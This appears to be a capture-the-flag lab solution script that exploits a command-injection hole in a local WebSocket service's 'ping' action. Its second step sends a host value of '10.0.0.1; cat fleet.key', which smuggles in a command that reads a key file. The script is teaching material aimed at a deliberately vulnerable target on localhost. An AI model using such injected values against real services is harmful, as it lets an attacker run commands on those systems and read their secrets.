#!/usr/bin/env bash
# Lab 34 — `ping` interpolates its host into a shell command.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9340}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab34
WS="ws://127.0.0.1:9341/control"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture --allow 127.0.0.1 >/dev/null

# 1. Learn the protocol from a frame that is meant to work.
"$H5I" websec socket "$WS" --session "$SESSION" --send '{"action":"status"}' >&2

# 2. The same frame with a semicolon in it.
"$H5I" websec socket "$WS" --session "$SESSION" \
    --send '{"action":"ping","host":"10.0.0.1; cat fleet.key"}' --wait-ms 3000 | flag
